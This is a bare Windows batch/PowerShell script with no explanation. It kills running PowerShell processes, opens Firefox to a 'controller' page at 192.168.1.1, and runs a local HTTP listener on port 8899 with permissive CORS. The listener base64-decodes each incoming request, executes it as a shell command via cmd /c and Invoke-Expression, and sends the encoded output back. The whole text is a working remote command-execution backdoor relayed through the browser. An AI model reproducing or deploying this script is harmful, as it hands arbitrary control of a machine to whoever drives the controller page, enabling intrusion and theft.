taskkill /F /IM powershell.exe
powershell -command " $controllerUrl = 'http://192.168.1.1/control/controller' ; $browser_path = 'C:\Program Files (x86)\Mozilla Firefox\firefox.exe' ; $args=$controllerUrl ; Add-Type -AssemblyName System.Web; $browser_proc = Start-Process -FilePath $browser_path -ArgumentList $args -passthru <# -WindowStyle hidden #>; $routes = @{'/exit'={exit} ; '*' = { return '<html><body>Hello world!</body></html>' }} ; $url = 'http://localhost:8899/' ;$listener = New-Object System.Net.HttpListener ; $listener.Prefixes.Add($url) ; $listener.Start() ; ; while ($listener.IsListening) { $context = $listener.GetContext() ; $request = $context.request ; $output = '' ; $size = $request.ContentLength64 + 1 ; $buffer = New-Object byte[] $size ; do { $count = $request.InputStream.Read($buffer, 0, $size) ; $output += $request.ContentEncoding.GetString($buffer, 0, $count) ; } until($count -lt $size) ; $request.InputStream.Close() ; $junk,$output = $output -split '=',2; $output = [System.Web.HttpUtility]::UrlDecode($output) ; $output = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($output)) ; $requestUrl = $context.Request.Url ; $response = $context.Response ; $response.Headers.Add('Access-Control-Allow-Origin: *'); $response.Headers.Add('Access-Control-Origin: *'); Write-Host $output ; $cmd = 'cmd /c ' + $output + ' 2>&1'; $cmdOutput = Invoke-Expression $cmd | Out-String; $cmdOutput=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmdOutput)); $localPath = $requestUrl.LocalPath ; $route = $routes.Get_Item($requestUrl.LocalPath) ; $content = $cmdOutput ; $buffer = [System.Text.Encoding]::UTF8.GetBytes($content) ;$response.ContentLength64 = $buffer.Length ; $response.OutputStream.Write($buffer, 0, $buffer.Length) ; $response.Close() ; } " 
